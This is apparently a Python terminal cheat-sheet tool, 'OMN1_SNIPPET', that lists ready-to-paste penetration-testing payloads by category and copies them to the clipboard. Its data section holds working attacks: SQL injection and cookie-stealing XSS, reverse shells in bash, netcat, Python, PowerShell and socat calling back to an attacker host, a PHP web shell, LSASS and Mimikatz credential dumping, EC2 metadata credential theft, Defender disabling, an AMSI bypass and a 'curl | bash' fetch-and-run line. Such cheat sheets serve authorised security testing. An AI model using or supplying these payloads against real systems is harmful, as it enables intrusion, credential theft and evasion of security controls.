#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────
#  OMN1_SNIPPET  –  “Everything-in-One” Offline Pentest Cheat-CLI
#  -------------------------------------------------------------
#  Author  :  mgledev
#  License :  MIT          (see repo root)
#  Version : 1.2.0
#
#  A single self-contained terminal UI that gives you **ready-to-paste
#  payloads, one-liners, enum checklists, escalation tricks, cloud &
#  container cheat-codes …  all offline**.
#
#  Optional niceties:
#    • colour  : pip install termcolor
#    • clipboard: pip install pyperclip
#
#  Happy hacking – stay legal & ethical! 🐱‍💻
# ──────────────────────────────────────────────────────────────

from pathlib import Path
from shutil import get_terminal_size
import os, sys, textwrap, json, re

# ── optional clipboard ──────────────────────────
try:
    import pyperclip
    def copy_clip(txt): pyperclip.copy(txt); print("📋  Copied!")
except ModuleNotFoundError:                         # pragma: no cover
    def copy_clip(txt): pass

# ── optional colours ────────────────────────────
try:
    from termcolor import cprint
except ModuleNotFoundError:                         # pragma: no cover
    def cprint(msg, colour=None, attrs=None): print(msg)

# ────────────────────  ASCII SPLASH  ─────────────────────────

SPLASH = r"""
 ██████╗ ███╗   ███╗███╗   ██╗ ██╗
██╔═══██╗████╗ ████║████╗  ██║███║
██║   ██║██╔████╔██║██╔██╗ ██║╚██║
██║   ██║██║╚██╔╝██║██║╚██╗██║ ██║
╚██████╔╝██║ ╚═╝ ██║██║ ╚████║ ██║
 ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═══╝ ╚═╝   OMN1_SNIPPET  by mgledev
"""

# ─────────────────────  SNIPPET DATA  ────────────────────────
#  Format:  { category: [ {d: description, p: payload}, … ] }

SNIPPETS: dict[str, list[dict]] = {

# ── Web / App-Layer ──────────────────────────────────────────
"🗄  SQL Injection": [
    {"d":"Boolean auth-bypass (string)","p":"' OR 1=1-- -"},
    {"d":"Time-based (MySQL)","p":"'||(SELECT SLEEP(5))-- -"},
    {"d":"Stack queries (MSSQL xp_cmdshell)","p":"'; EXEC master..xp_cmdshell 'whoami'--"},
    {"d":"Extract 1st user (LIMIT)","p":"' UNION SELECT user(),2 LIMIT 0,1-- -"},
],
"📑  XSS Quick List": [
    {"d":"Classic alert","p":"<script>alert(1)</script>"},
    {"d":"HTML attr","p":"\" onmouseover=alert(1) x=\""},
    {"d":"SVG payload","p":"<svg/onload=confirm`1`>"},
    {"d":"Fetch exfil","p":"<script>fetch('//LHOST/c?'+document.cookie)</script>"},
    {"d":"Iframe CSP bypass (data)","p":"<iframe srcdoc=\"<script>alert`1`</script>\"></iframe>"},
],
"📂  LFI / RFI & PHP Filters": [
    {"d":"Read /etc/passwd","p":"../../../../../../etc/passwd"},
    {"d":"Base64 source","p":"php://filter/convert.base64-encode/resource=index.php"},
    {"d":"PHP expect wrapper RCE","p":"php://filter/convert.base64-encode/resource=data:,<?php system($_GET[0]);?>"},
    {"d":"Zip slip write","p":"../../../../../../../var/www/html/shell.php"},
],
"🖥  Web-Fuzz One-Liners": [
    {"d":"Gobuster common","p":"gobuster dir -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50"},
    {"d":"ffuf vhost","p":"ffuf -w sub.txt -H 'Host: FUZZ.TARGET' -u http://TARGET -fs 4242"},
    {"d":"feroxbuster recurse & 404 filter","p":"feroxbuster -u http://TARGET -d 3 -x php,txt,html -C 404,403"},
],

# ── Reverse-Shell Arsenal ────────────────────────────────────
"🎯  Reverse Shells": [
    {"d":"Bash TCP","p":"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"},
    {"d":"Ncat -e (busybox)","p":"nc -e /bin/sh <LHOST> <LPORT>"},
    {"d":"Python3 full TTY","p":"python3 -c 'import os,pty,socket,sys;s=socket.socket();s.connect((\"<LHOST>\",<LPORT>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"},
    {"d":"PowerShell TCP","p":"powershell -nop -c \"$a='';$b=New-Object Net.Sockets.TCPClient('<LHOST>',<LPORT>);$c=$b.GetStream();[byte[]]$d=0..65535|%{0};while(($e=$c.Read($d,0,$d.Length)) -ne 0){$a=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($d,0,$e);$f=(iex $a 2>&1 | Out-String );$g=(New-Object -TypeName System.Text.ASCIIEncoding).GetBytes($f);$c.Write($g,0,$g.Length)}\""},
    {"d":"Socat PTY","p":"socat TCP:<LHOST>:<LPORT> EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane"},
],

# ── Linux Post-Ex & PrivEsc ──────────────────────────────────
"🛠  Linux Post-Ex": [
    {"d":"Spawn TTY","p":"python3 -c 'import pty,os; pty.spawn(\"/bin/bash\")'"},
    {"d":"List SUID","p":"find / -perm -4000 -type f 2>/dev/null"},
    {"d":"Writable cron scripts","p":"find /etc/cron* -type f -writable -ls"},
    {"d":"Search passwords in history","p":"grep -iE 'pass|SECRET' ~/.bash_history"},
    {"d":"Capabilities binaries","p":"getcap -r / 2>/dev/null"},
    {"d":"Docker group escape","p":"docker run -v /:/mnt --rm -it alpine chroot /mnt sh"},
],
"⚙️  GTFOBins – Instant root": [
    {"d":"Python SUID","p":"python -c 'import os,pty,subprocess; os.setuid(0); os.system(\"/bin/bash\")'"},
    {"d":"Find writable /etc/passwd","p":"sed -i 's/^root:.*/root::$1$XyZ..../' /etc/passwd"},
],
"🍣  Container escapes": [
    {"d":"Dirty pipe (CVE-2022-0847)","p":"wget ...dirtypipe.c; gcc dirtypipe.c -o p && ./p /etc/passwd /tmp/sh"},
    {"d":"Privileged docker","p":"docker run -v /:/host --privileged -it alpine chroot /host bash"},
],

# ── Windows Post-Ex & Privesc ────────────────────────────────
"🪟  Windows Post-Ex": [
    {"d":"Seatbelt all","p":"Seatbelt.exe -group=all"},
    {"d":"WinPEAS binary","p":"winPEASany.exe quiet local sysinfo userinfo systeminfo > report.txt"},
    {"d":"Resolve plaintext creds","p":"findstr /si password *.txt *.xml *.config"},
    {"d":"PowerView domain enum","p":"Import-Module .\\PowerView.ps1; Get-NetUser | select samaccountname"},
    {"d":"LSASS dump (procdump)","p":"procdump64.exe -ma lsass.exe lsass.dmp"},
],
"🔑  Lateral / Credential Stuff": [
    {"d":"Mimikatz sekurlsa::logonpasswords","p":"privilege::debug \nsekurlsa::logonpasswords"},
    {"d":"SharpHound (bloodhound)","p":"SharpHound.exe -c All -domain comptest.local -zip"},
    {"d":"Crackmapexec SMB spray","p":"cme smb 10.0.0.0/24 -u users.txt -p Summer2024"},
],

# ── Cloud & Other ────────────────────────────────────────────
"☁️  AWS & Cloud": [
    {"d":"AWS creds location","p":"~/.aws/credentials • ~/.aws/config"},
    {"d":"List S3 buckets","p":"aws s3 ls"},
    {"d":"Enumerate IAM perms","p":"aws iam list-attached-user-policies --user-name Bob"},
    {"d":"Steal metadata (EC2)","p":"curl 169.254.169.254/latest/meta-data/iam/security-credentials/"},
],
"📦  Useful File Transfers": [
    {"d":"Python HTTP server","p":"python3 -m http.server 80"},
    {"d":"PHP web-shell","p":"<?php system($_GET['cmd']); ?>"},
    {"d":"Certutil download","p":"certutil -urlcache -split -f http://<LHOST>/file.exe file.exe"},
    {"d":"Nc upload","p":"nc -w 3 <LHOST> <LPORT> < file.bin"},
],

# ── AV / EDR Evasion Quick&Dirty ────────────────────────────
"🩻  Evasion Tricks": [
    {"d":"Disable Defender (needs admin)","p":"powershell -ep bypass -c Set-MpPreference -DisableRealtimeMonitoring $true"},
    {"d":"Bypass AMSI (PowerShell)","p":"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"},
    {"d":"Echo-encode payload","p":"echo ^<script>alert(1)^</script> > x.hta"},
],

# ── Misc / Helpers ───────────────────────────────────────────
"📜  Misc & Helpers": [
    {"d":"Base64 encode","p":"echo -n 'string' | base64"},
    {"d":"Run binary from RAM (Linux)","p":"curl http://IP/shell | bash"},
    {"d":"Kill noisy processes","p":"pkill -f log4jscan; pkill -f nikto"},
    {"d":"Speed test wget","p":"wget --output-document=/dev/null http://speedtest.tele2.net/100MB.zip"},
],

}

# ──────────────────────  CORE FUNCTIONS  ──────────────────────

def banner(title=""):
    width = get_terminal_size().columns
    print()
    cprint(title.center(width, "═"), "cyan", attrs=["bold"])

def show_snippet(snip: dict):
    cprint(f"\n📌  {snip['d']}", "yellow", attrs=["bold"])
    print(textwrap.indent(snip['p'], "    "))
    copy_clip(snip['p'])
    print()

def search(keyword: str):
    keyword = keyword.lower()
    out = []
    for cat, lst in SNIPPETS.items():
        for sn in lst:
            if keyword in sn['d'].lower() or keyword in sn['p'].lower():
                out.append((cat, sn))
    return out

# ─────────────────────────────  UI  ────────────────────────────

def main():
    os.system("clear")
    print(SPLASH)
    input("⏎  Press Enter to start …")

    while True:
        os.system("clear")
        banner("CATEGORIES")
        for idx, cat in enumerate(SNIPPETS, 1):
            cprint(f"[{idx:02}] {cat}", "green")
        cprint("[S ] Search    [Q ] Quit\n", "magenta")

        choice = input("▶  ").strip().lower()
        if choice in ("q", "quit", "exit"):
            print("👋  Bye!")
            break
        if choice in ("s", "search"):
            key = input("\n🔍  Keyword: ").strip()
            res = search(key)
            if not res:
                input("❌  Nothing found.  Enter …")
                continue
            for i, (cat, sn) in enumerate(res, 1):
                cprint(f"\n[{i}] {cat} → {sn['d']}", "blue")
                print(textwrap.indent(sn['p'], "    "))
            input("\n✅  Enter to continue …")
            continue
        if not choice.isdigit():
            continue
        cat_idx = int(choice) - 1
        if cat_idx not in range(len(SNIPPETS)):
            continue
        cat = list(SNIPPETS.keys())[cat_idx]

        while True:
            os.system("clear")
            banner(cat)
            for i, sn in enumerate(SNIPPETS[cat], 1):
                print(f"[{i:02}] {sn['d']}")
            cprint("[B ] Back\n", "magenta")
            sub = input("▶  ").strip().lower()
            if sub in ("b", "back"):
                break
            if not sub.isdigit():
                continue
            sn_idx = int(sub) - 1
            if sn_idx in range(len(SNIPPETS[cat])):
                show_snippet(SNIPPETS[cat][sn_idx])
                input("⏎  Continue …")

# ───────────────────────────────────────────────────────────────

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n👋  Interrupted – stay safe!")
